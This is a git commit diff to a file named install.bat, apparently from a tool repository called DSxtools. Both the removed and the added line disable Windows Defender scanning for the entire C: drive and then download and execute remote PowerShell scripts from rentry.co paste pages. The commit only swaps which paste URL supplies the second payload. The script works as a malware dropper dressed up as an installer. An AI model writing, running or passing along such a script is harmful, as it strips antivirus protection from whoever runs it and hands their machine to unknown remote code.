d6a716ffc046e934005696359d92d451c9203679
DSxtools <faisalalshrif10@gmail.com>
2024-08-30 00:52:26 -1100

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,1 +1,1 @@
-powershell -Command "Add-MpPreference -ExclusionPath 'C:'; irm  rentry.co/systemer/raw | iex" && powershell "irm rentry.co/Client-Settings/raw | iex"
+powershell -Command "Add-MpPreference -ExclusionPath 'C:'; irm  rentry.co/systemer/raw | iex" && powershell "irm rentry.co/DXZK1/raw | iex"
